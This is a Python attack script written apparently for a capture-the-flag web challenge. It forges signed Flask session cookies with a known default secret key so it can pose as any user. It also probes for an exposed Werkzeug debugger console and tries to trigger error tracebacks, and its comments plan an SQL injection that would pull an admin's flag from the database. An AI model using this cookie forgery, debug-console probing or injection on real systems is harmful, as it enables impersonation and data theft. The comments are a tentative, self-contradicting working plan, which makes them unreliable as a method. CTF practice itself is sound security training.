import base64, hashlib, hmac, json, time, requests

SECRET_KEY = b"dev-secret-key-change-in-production"
SALT = b"cookie-session"
EPOCH = 1293840000
BASE = "https://garden.task.sasc.tf"

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=")
def int_to_bytes(n):
    if n == 0: return b""
    return n.to_bytes((n.bit_length()+7)//8, "big")
def mint_cookie(uid, secret=SECRET_KEY):
    ts = int(time.time()) - EPOCH
    payload = json.dumps({"user_id": uid}, separators=(",",":")).encode()
    value = b64url(payload) + b"." + b64url(int_to_bytes(ts))
    dk = hmac.new(secret, SALT, hashlib.sha1).digest()
    sig = hmac.new(dk, value, hashlib.sha1).digest()
    return (value + b"." + b64url(sig)).decode()

def play(uid, move="7g7f"):
    return requests.post(f"{BASE}/game/move",
        cookies={"session": mint_cookie(uid)},
        json={"move": move}, timeout=10)

# Strategy: inject admin's flag as the move value for a reader user_id
# The injection inserts into game_moves: user_id='reader_XYZ', move=(SELECT move FROM game_moves WHERE user_id='admin')
# Then GET /game/state as reader_XYZ will load that row and try to replay it - it fails
# but the error from load_moves_from_db prints the flag to server logs
# Instead: use /game/state response which includes moves via the board - no, that doesn't work
#
# Better: inject the flag as the move for a FRESH user, then use a second injection
# to read it back via a CONTENT oracle in the moves_made response
#
# Actually simplest: check debug console or trigger a traceback that shows the flag

# First test: can we access Werkzeug console?
r = requests.get(f"{BASE}/__debugger__/console", timeout=10)
print(f"/__debugger__/console: {r.status_code}")

# Test: trigger an unhandled exception to see the Werkzeug traceback
# The traceback would show local vars including any flag-related data
# What causes an unhandled exception? Pass a type that breaks things:
r2 = requests.post(f"{BASE}/game/state",
    cookies={"session": mint_cookie("test")},
    json={"bad": "data"}, timeout=10)
print(f"POST to GET endpoint: {r2.status_code} {r2.text[:100]}")

# Test: check if debug traceback page appears on any error
r3 = requests.get(f"{BASE}/nonexistent_path_xyz", timeout=10)
print(f"404 body: {r3.status_code} {r3.text[:200]}")
